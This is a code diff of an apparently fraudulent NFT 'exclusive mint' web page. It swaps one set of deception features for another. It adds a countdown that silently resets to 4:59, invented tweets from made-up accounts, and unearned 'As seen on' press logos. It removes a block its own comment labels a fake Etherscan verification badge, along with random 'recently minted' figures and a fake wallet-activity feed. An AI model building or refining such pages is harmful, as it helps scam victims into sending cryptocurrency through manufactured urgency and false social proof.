@@ -197,6 +197,27 @@
       color: var(--gold);
       text-shadow: 0 2px 12px rgba(255,224,102,0.12);
     }
+    .mint-timer {
+      width: 100%;
+      text-align: center;
+      font-family: 'Unbounded', Arial, sans-serif;
+      font-size: 1.15rem;
+      font-weight: 700;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
+      color: #00eaff;
+      background: linear-gradient(90deg, #009efd 0%, #2af598 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-fill-color: transparent;
+      text-shadow: 0 2px 12px #009efd33;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px 0 #009efd22;
+      padding: 6px 0 2px 0;
+      user-select: none;
+      transition: color 0.2s;
+    }
     .mint-status {
       font-size: 1.1rem;
       font-weight: 600;
@@ -487,198 +508,140 @@
     @media (max-width: 700px) {
       .mint-leaf-bg-item { opacity: 0.06 !important; width: 48px !important; }
     }
-    .wallet-activity-bar {
-      width: 100vw;
-      background: linear-gradient(90deg, #009efd 0%, #2af598 100%);
-      color: #fff;
-      font-weight: 700;
-      font-size: 1.08rem;
-      padding: 10px 0;
-      text-align: center;
-      letter-spacing: 1px;
-      box-shadow: 0 2px 16px 0 rgba(42,245,152,0.10);
-      z-index: 100;
-      position: relative;
-      border-bottom: 2px solid #2af59844;
-      animation: fadeInDown 1.2s cubic-bezier(.23,1.01,.32,1);
-    }
-    .wallet-activity-emoji { margin-right: 8px; }
-    @keyframes fadeInDown { 0% { opacity: 0; transform: translateY(-30px); } 100% { opacity: 1; transform: none; } }
-    .mint-timer {
-      font-size: 1.15rem;
-      font-weight: 700;
-      color: var(--gold);
-      margin-bottom: 8px;
-      letter-spacing: 1px;
-      text-shadow: 0 2px 12px rgba(255,224,102,0.12);
+    /* As seen on */
+    .as-seen-on {
       display: flex;
       align-items: center;
-      gap: 8px;
-      justify-content: center;
-    }
-    .minted-last10 {
-      font-size: 1.08rem;
-      font-weight: 600;
-      color: #ff6b6b;
-      margin-bottom: 8px;
-      letter-spacing: 1px;
-      text-shadow: 0 2px 12px rgba(255,107,107,0.12);
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      justify-content: center;
-    }
-    .nft-cards-row {
-      display: flex;
       gap: 18px;
-      margin: 24px 0 8px 0;
+      margin: 10px 0 18px 0;
       justify-content: center;
-      width: 100%;
-      flex-wrap: wrap;
+      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.15s both;
     }
-    .nft-card {
-      background: var(--bg-card);
-      border: 2.5px solid var(--border);
-      border-radius: 18px;
-      box-shadow: 0 4px 24px 0 rgba(42,245,152,0.10);
-      padding: 18px 12px 16px 12px;
-      min-width: 140px;
-      max-width: 160px;
-      width: 100%;
-      min-height: 240px;
+    .as-seen-on-label {
+      color: var(--text-secondary);
+      font-family: 'Inter', Arial, sans-serif;
+      font-size: 1.05rem;
+      font-weight: 600;
+      letter-spacing: 1px;
+      margin-right: 8px;
+    }
+    .as-seen-on-logos {
       display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-      position: relative;
-      box-sizing: border-box;
-      transition: box-shadow 0.2s, border 0.2s;
+      gap: 14px;
     }
-    .nft-card-rare {
-      border: 2.5px solid var(--gold);
-      box-shadow: 0 0 16px 2px #ffe06699, 0 4px 24px 0 rgba(42,245,152,0.10);
+    .as-seen-logo {
+      height: 28px;
+      width: auto;
+      filter: drop-shadow(0 2px 8px #2af59844) brightness(1.15);
+      opacity: 0;
+      animation: logoFadeIn 0.7s forwards;
+    }
+    .as-seen-logo:nth-child(1) { animation-delay: 0.2s; }
+    .as-seen-logo:nth-child(2) { animation-delay: 0.35s; }
+    .as-seen-logo:nth-child(3) { animation-delay: 0.5s; }
+    .as-seen-logo:nth-child(4) { animation-delay: 0.65s; }
+    @keyframes logoFadeIn {
+      from { opacity: 0; transform: translateY(12px) scale(0.95); }
+      to { opacity: 1; transform: none; }
+    }
+    /* Twitter отзывы */
+    .twitter-reviews-wrap {
+      margin: 32px auto 0 auto;
+      max-width: 480px;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: var(--bg-card);
+      border-radius: 18px;
+      box-shadow: var(--shadow);
+      border: 1.5px solid var(--border);
+      padding: 18px 8px 12px 8px;
+      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.25s both;
+      position: relative;
+      overflow: hidden;
+    }
+    .twitter-reviews-slider {
+      display: flex;
+      flex-direction: row;
+      width: 100%;
+      transition: transform 0.7s cubic-bezier(.23,1.01,.32,1);
+      will-change: transform;
+    }
+    .twitter-review-slide {
+      min-width: 100%;
+      max-width: 100%;
+      display: flex;
+      align-items: flex-start;
+      gap: 16px;
+      padding: 0 8px;
+      opacity: 0;
+      transition: opacity 0.5s;
+      position: absolute;
+      left: 0; top: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      background: none;
+      pointer-events: none;
+    }
+    .twitter-review-slide.active {
+      opacity: 1;
+      position: relative;
+      pointer-events: auto;
       z-index: 2;
     }
-    .nft-card-rare .nft-img.unrevealed {
-      box-shadow: 0 0 16px 2px #ffe06699, 0 2px 8px 0 #2af59822;
-    }
-    .nft-badge {
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      background: linear-gradient(90deg, #ffe066 0%, #fffbe6 100%);
-      color: #23234a;
-      font-weight: 900;
-      font-size: 0.92rem;
-      border-radius: 8px;
-      padding: 3px 12px 3px 8px;
-      box-shadow: 0 2px 8px 0 #ffe06644;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      z-index: 3;
-      letter-spacing: 1px;
-    }
-    .nft-badge-icon { font-size: 1.1em; margin-right: 2px; }
-    .nft-badge-empty { height: 24px; margin-bottom: 2px; }
-    .nft-img.unrevealed {
-      width: 72px;
-      height: 72px;
-      border-radius: 12px;
-      background: repeating-linear-gradient(135deg, #23234a 0 12px, #2af59822 12px 24px);
-      margin-bottom: 18px;
+    .twitter-avatar {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #23234a 60%, #2af598 100%);
+      border: 2.5px solid #fff;
+      box-shadow: 0 2px 8px 0 #2af59822;
       display: flex;
       align-items: center;
       justify-content: center;
-      position: relative;
-      box-shadow: 0 2px 8px 0 #2af59822;
+      font-size: 1.5rem;
+      font-family: 'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol',sans-serif;
+      user-select: none;
+      overflow: hidden;
+      line-height: 1;
+      padding: 2px;
     }
-    .nft-rarity {
-      font-size: 1.01rem;
-      color: var(--gold);
-      font-weight: 700;
-      margin-bottom: 4px;
-      text-align: center;
-      min-height: 20px;
-      width: 100%;
-    }
-    .nft-unrevealed {
+    .twitter-user {
+      font-family: 'Unbounded', Arial, sans-serif;
       font-size: 1.08rem;
-      color: var(--text-secondary);
       font-weight: 700;
-      margin-bottom: 12px;
-      text-align: center;
-      width: 100%;
-      letter-spacing: 1px;
-    }
-    .nft-reveal-btn {
-      background: var(--button-gradient);
-      color: #fff;
-      border: none;
-      border-radius: 10px;
-      padding: 9px 18px;
-      font-size: 1.01rem;
-      font-weight: 800;
-      cursor: not-allowed;
-      opacity: 0.8;
+      color: #00eaff;
+      letter-spacing: 0.5px;
       margin-bottom: 2px;
-      margin-top: auto;
-      width: 100%;
-      transition: opacity 0.18s, box-shadow 0.18s;
-      box-shadow: 0 2px 8px 0 #2af59822;
-    }
-    .nft-reveal-btn:hover, .nft-reveal-btn:focus {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-    /* Модальное окно */
-    .nft-modal-bg {
-      position: fixed;
-      left: 0; top: 0; right: 0; bottom: 0;
-      background: rgba(24,25,43,0.82);
-      z-index: 99999;
       display: flex;
       align-items: center;
-      justify-content: center;
-      animation: fadeIn 0.3s;
+      gap: 6px;
     }
-    .nft-modal {
-      background: var(--bg-card);
-      border-radius: 18px;
-      box-shadow: 0 8px 32px 0 #2af59833, 0 1.5px 0 0 #ffe06644;
-      padding: 32px 28px 24px 28px;
-      min-width: 260px;
-      max-width: 90vw;
-      text-align: center;
-      border: 2px solid var(--gold);
-      position: relative;
+    .twitter-handle {
+      font-family: 'Inter', Arial, sans-serif;
+      font-size: 0.98rem;
+      color: var(--text-secondary);
+      font-weight: 400;
+      margin-left: 4px;
     }
-    .nft-modal-title {
-      color: var(--gold);
-      font-size: 1.18rem;
-      font-weight: 900;
-      margin-bottom: 18px;
-      letter-spacing: 1px;
-    }
-    .nft-modal-close {
-      background: var(--button-gradient);
-      color: #fff;
-      border: none;
+    .twitter-text {
+      font-family: 'Inter', Arial, sans-serif;
+      font-size: 1.08rem;
+      color: var(--text-main);
+      background: linear-gradient(90deg, #009efd11 0%, #2af59811 100%);
       border-radius: 10px;
-      padding: 10px 32px;
-      font-size: 1.01rem;
-      font-weight: 800;
-      cursor: pointer;
-      box-shadow: 0 2px 8px 0 #2af59822;
-      transition: opacity 0.18s, box-shadow 0.18s;
-    }
-    .nft-modal-close:hover, .nft-modal-close:focus {
-      opacity: 0.7;
+      padding: 8px 14px;
+      margin-top: 2px;
+      box-shadow: 0 2px 8px 0 #009efd11;
+      line-height: 1.5;
+      word-break: break-word;
     }
     @media (max-width: 700px) {
-      .nft-cards-row { flex-direction: column; gap: 14px; align-items: center; }
-      .nft-card { max-width: 100%; min-width: 90px; min-height: 200px; }
-      .nft-modal { padding: 18px 8px 14px 8px; min-width: 160px; }
+      .as-seen-logo { height: 20px; }
+      .twitter-avatar { width: 32px; height: 32px; font-size: 1.1rem; }
+      .twitter-reviews-wrap { padding: 10px 2px 6px 2px; }
     }
   </style>
 </head>
@@ -726,6 +689,16 @@
         </div>
         <span class="logo-title">EXCLUSIVE MINT</span>
       </div>
+      <!-- As seen on block -->
+      <div class="as-seen-on">
+        <span class="as-seen-on-label">As seen on:</span>
+        <div class="as-seen-on-logos">
+          <img src="https://cryptologos.cc/logos/coingecko-coingecko-logo.svg?v=026" alt="CoinGecko" class="as-seen-logo"/>
+          <img src="https://cryptologos.cc/logos/cointelegraph-cointelegraph-logo.svg?v=026" alt="CoinTelegraph" class="as-seen-logo"/>
+          <img src="https://cryptologos.cc/logos/zksync-zksync-logo.svg?v=026" alt="zkSync" class="as-seen-logo"/>
+          <img src="https://cryptologos.cc/logos/decrypt-decrypt-logo.svg?v=026" alt="Decrypt" class="as-seen-logo"/>
+        </div>
+      </div>
       <span class="exclusive-badge">PRIVATE MINT</span>
       <div class="stats-bar">
         <div class="stat-card">
@@ -747,52 +720,15 @@
   <!-- Основной блок минта -->
   <div class="mint-section-wrap">
     <div class="mint-section">
-      <!-- FOMO таймер -->
-      <div class="mint-timer" id="mintTimer">⏳ Mint ends in: <span id="timerCountdown">05:00</span></div>
-      <!-- Блок minted за 10 минут -->
-      <div class="minted-last10" id="mintedLast10">🔥 213 NFTs minted in the last 10 minutes</div>
       <div class="mint-counter" id="mintCounter">927 / 1000 NFTs Minted</div>
+      <!-- Mint ends in timer -->
+      <div class="mint-timer" id="mintTimer">⏳ Mint ends in: 00:04:59</div>
       <div class="mint-status" id="mintStatus">
         <span class="status-dot" id="statusDot"></span>
         <span id="statusText">LIVE</span>
       </div>
       <button class="mint-btn" id="mintBtn" onclick="mint()">Mint Now</button>
       <div class="loader" id="loader"></div>
-      <!-- NFT карточки -->
-      <div class="nft-cards-row">
-        <div class="nft-card nft-card-rare">
-          <div class="nft-img unrevealed"></div>
-          <div class="nft-badge"><span class="nft-badge-icon">🏆</span> Top 1%</div>
-          <div class="nft-rarity">Rarity Score: 94.1</div>
-          <div class="nft-unrevealed">Unrevealed</div>
-          <button class="nft-reveal-btn" disabled onclick="showRevealPopup(event)">Reveal after mint</button>
-        </div>
-        <div class="nft-card">
-          <div class="nft-img unrevealed"></div>
-          <div class="nft-badge-empty"></div>
-          <div class="nft-rarity">&nbsp;</div>
-          <div class="nft-unrevealed">Unrevealed</div>
-          <button class="nft-reveal-btn" disabled onclick="showRevealPopup(event)">Reveal after mint</button>
-        </div>
-        <div class="nft-card">
-          <div class="nft-img unrevealed"></div>
-          <div class="nft-badge-empty"></div>
-          <div class="nft-rarity">&nbsp;</div>
-          <div class="nft-unrevealed">Unrevealed</div>
-          <button class="nft-reveal-btn" disabled onclick="showRevealPopup(event)">Reveal after mint</button>
-        </div>
-      </div>
-      <!-- NFT Reveal Modal -->
-      <div class="nft-modal-bg" id="nftModalBg" style="display:none;">
-        <div class="nft-modal">
-          <div class="nft-modal-title">You must mint your NFT before revealing it.</div>
-          <button class="nft-modal-close" onclick="closeRevealPopup()">OK</button>
-        </div>
-      </div>
-      <!-- Discord CTA -->
-      <div class="discord-cta">
-        <a href="#" class="discord-btn" target="_blank">Join private Discord after mint</a>
-      </div>
     </div>
   </div>
 
@@ -806,6 +742,13 @@
     </div>
   </div>
 
+  <!-- Twitter отзывы -->
+  <div class="twitter-reviews-wrap">
+    <div class="twitter-reviews-slider" id="twitterReviewsSlider">
+      <!-- Slides will be injected here -->
+    </div>
+  </div>
+
   <!-- Логи минта -->
   <div class="log-section-wrap">
     <div class="log-section">
@@ -814,36 +757,6 @@
         <!-- log items -->
       </div>
     </div>
-  </div>
-
-  <!-- Twitter отзывы -->
-  <div class="twitter-slider-wrap">
-    <div class="twitter-slider" id="twitterSlider">
-      <div class="twitter-slide">“Just minted 3, I'm all in! 🚀”</div>
-      <div class="twitter-slide">“This is THE drop. Don't miss this one.”</div>
-      <div class="twitter-slide">“@zk_ai_hub: this mint is about to blow up!”</div>
-    </div>
-    <div class="twitter-slider-dots" id="twitterSliderDots"></div>
-  </div>
-
-  <!-- As seen on -->
-  <div class="as-seen-on-wrap">
-    <span class="as-seen-on-label">As seen on</span>
-    <div class="as-seen-logos">
-      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">CoinTelegraph</text></svg>
-      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">zkSync</text></svg>
-      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">CoinGecko</text></svg>
-      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">Decrypt</text></svg>
-      <svg class="as-seen-logo" viewBox="0 0 80 24"><rect width="80" height="24" rx="6" fill="#fff"/><text x="40" y="16" text-anchor="middle" fill="#23234a" font-size="12" font-family="Arial">DappRadar</text></svg>
-    </div>
-  </div>
-
-  <!-- Фейковый Etherscan -->
-  <div class="etherscan-fake-wrap">
-    <a href="#" class="etherscan-fake-link">
-      <span class="etherscan-fake-check">✔</span>
-      <span class="etherscan-fake-label">Verified contract on Etherscan</span>
-    </a>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
@@ -920,8 +833,8 @@
       }
     }
     function updateStatsBar() {
-      document.getElementById('floorPrice').innerHTML = `${floorPrice} ETH <span class='stat-up'>↑</span>`;
-      document.getElementById('volumeTraded').innerHTML = `${volumeTraded.toLocaleString()} ETH <span class='stat-up'>(+13% past hour)</span>`;
+      document.getElementById('floorPrice').innerText = `${floorPrice} ETH`;
+      document.getElementById('volumeTraded').innerText = `${volumeTraded.toLocaleString()} ETH`;
       animateCounter(animatedHolders, holders, val => {
         animatedHolders = val;
         document.getElementById('holders').innerText = animatedHolders;
@@ -1098,7 +1011,83 @@
       updateMintersList();
       updateLogList();
     }
-    // Плавная загрузка
+    // --- Mint ends in timer ---
+    let timerSeconds = 299; // 4:59
+    function updateMintTimer() {
+      const el = document.getElementById('mintTimer');
+      if (!el) return;
+      let min = Math.floor(timerSeconds / 60);
+      let sec = timerSeconds % 60;
+      el.innerText = `⏳ Mint ends in: 00:${min.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
+    }
+    function startMintTimer() {
+      timerSeconds = 299;
+      updateMintTimer();
+      setInterval(() => {
+        timerSeconds--;
+        if (timerSeconds < 0) timerSeconds = 299;
+        updateMintTimer();
+      }, 1000);
+    }
+    // --- Twitter отзывы ---
+    const twitterReviews = [
+      {
+        avatar: '🦄',
+        name: 'CryptoUnicorn',
+        handle: '@unicorn_eth',
+        text: 'Just minted 3, can't wait to reveal 🔥'
+      },
+      {
+        avatar: '🐧',
+        name: 'PenguMint',
+        handle: '@pengu_mint',
+        text: 'Best drop this year. Calling it now. 💎'
+      },
+      {
+        avatar: '🚀',
+        name: 'MoonRider',
+        handle: '@moonrider',
+        text: 'LFG! This is about to explode 🚀'
+      },
+      {
+        avatar: '🦊',
+        name: 'Foxie',
+        handle: '@foxie_nft',
+        text: 'Minted and ready for the moon!'
+      },
+      {
+        avatar: '🐼',
+        name: 'PandaHodl',
+        handle: '@panda_hodl',
+        text: 'This community is wild. Love it!'
+      }
+    ];
+    let twitterReviewIndex = 0;
+    function renderTwitterReviews() {
+      const slider = document.getElementById('twitterReviewsSlider');
+      if (!slider) return;
+      slider.innerHTML = '';
+      twitterReviews.forEach((review, idx) => {
+        const slide = document.createElement('div');
+        slide.className = 'twitter-review-slide' + (idx === twitterReviewIndex ? ' active' : '');
+        slide.innerHTML = `
+          <div class="twitter-avatar">${review.avatar}</div>
+          <div>
+            <div class="twitter-user">${review.name} <span class="twitter-handle">${review.handle}</span></div>
+            <div class="twitter-text">${review.text}</div>
+          </div>
+        `;
+        slider.appendChild(slide);
+      });
+    }
+    function startTwitterSlider() {
+      renderTwitterReviews();
+      setInterval(() => {
+        twitterReviewIndex = (twitterReviewIndex + 1) % twitterReviews.length;
+        renderTwitterReviews();
+      }, 4000);
+    }
+    // --- Плавная загрузка ---
     window.onload = () => {
       document.body.style.opacity = 0;
       setTimeout(() => {
@@ -1113,70 +1102,11 @@
       // Контракт инициализируется только при необходимости
       // Запускаем live-минтинг раз в 30 секунд
       setInterval(addLiveMinter, 30000);
+      // Запуск таймера минта
+      startMintTimer();
+      // Запуск слайдера отзывов
+      startTwitterSlider();
     };
-
-    // --- FOMO таймер ---
-    let timerSeconds = 300;
-    function updateTimer() {
-      let min = Math.floor(timerSeconds / 60);
-      let sec = timerSeconds % 60;
-      document.getElementById('timerCountdown').innerText = `${min.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
-      timerSeconds--;
-      if (timerSeconds < 0) timerSeconds = 300;
-    }
-    setInterval(updateTimer, 1000);
-
-    // --- Minted in last 10 min ---
-    function updateMintedLast10() {
-      const x = Math.floor(Math.random() * 201) + 100;
-      document.getElementById('mintedLast10').innerText = `🔥 ${x} NFTs minted in the last 10 minutes`;
-    }
-    setInterval(updateMintedLast10, 120000);
-    updateMintedLast10();
-
-    // --- Twitter slider ---
-    const twitterSlides = document.querySelectorAll('.twitter-slide');
-    const twitterSlider = document.getElementById('twitterSlider');
-    const twitterSliderDots = document.getElementById('twitterSliderDots');
-    let twitterIndex = 0;
-    function showTwitterSlide(idx) {
-      twitterSlides.forEach((slide, i) => {
-        slide.style.display = i === idx ? 'block' : 'none';
-      });
-      if (twitterSliderDots) {
-        twitterSliderDots.innerHTML = '';
-        twitterSlides.forEach((_, i) => {
-          const dot = document.createElement('span');
-          dot.className = 'twitter-dot' + (i === idx ? ' active' : '');
-          dot.onclick = () => { twitterIndex = i; showTwitterSlide(i); };
-          twitterSliderDots.appendChild(dot);
-        });
-      }
-    }
-    setInterval(() => {
-      twitterIndex = (twitterIndex + 1) % twitterSlides.length;
-      showTwitterSlide(twitterIndex);
-    }, 3500);
-    showTwitterSlide(0);
-
-    // --- Wallet activity bar ---
-    setInterval(() => {
-      const fakeWallets = [
-        '0x12...Abc', '0x5e...0b', '0xA7...c9', '0x1F...0d', '0x9a...0B', '0xC0...d9', '0xB1...c0', '0x2A...1b', '0x8F...9d', '0x3C...2d', '0xD8...e7', '0x6B...5c', '0xE4...f3'
-      ];
-      const n = Math.floor(Math.random() * 9) + 1;
-      const w = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
-      document.getElementById('walletActivityBar').innerHTML = `<span class='wallet-activity-emoji'>💸</span> Wallet connected: <b>${w}</b> just minted <b>${n} NFTs</b>`;
-    }, 4200);
-
-    // --- NFT Reveal Modal ---
-    function showRevealPopup(e) {
-      if (e) e.preventDefault();
-      document.getElementById('nftModalBg').style.display = 'flex';
-    }
-    function closeRevealPopup() {
-      document.getElementById('nftModalBg').style.display = 'none';
-    }
   </script>
 </body>
 </html>
